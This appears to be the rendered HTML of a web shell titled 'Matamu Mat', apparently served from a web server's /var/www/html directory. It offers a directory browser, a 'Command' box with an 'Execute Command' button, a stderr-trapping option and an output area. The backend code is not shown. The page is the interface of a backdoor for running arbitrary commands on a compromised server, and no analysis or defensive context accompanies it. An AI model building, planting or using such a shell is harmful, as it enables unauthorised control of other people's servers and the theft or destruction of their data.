
<html>
<head>
<title> Matamu Mat </title>
</head>
<body>
<hr><br>


<form name="myform" action="" method="post">
<p>Current working directory: <b>
<a href="?work_dir=/">Root</a>/<a href="?work_dir=%2Fvar">var</a>/<a href="?work_dir=%2Fvar%2Fwww">www</a>/<a href="?work_dir=%2Fvar%2Fwww%2Fhtml">html</a>/</b></p>
<p>Choose new working directory:
<select name="work_dir" onChange="this.form.submit()">
<option value="/var/www/html" selected>Current Directory</option>
<option value="/var/www">Parent Directory</option>

</select></p>

<p>Command: <input type="text" name="command" size="60">
<input name="submit_btn" type="submit" value="Execute Command"></p>

<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p>
<textarea cols="80" rows="20" readonly>


</textarea>
</form>

<script language="JavaScript" type="text/javascript">
document.forms[0].command.focus();
</script>

<hr>

</body>
</html>
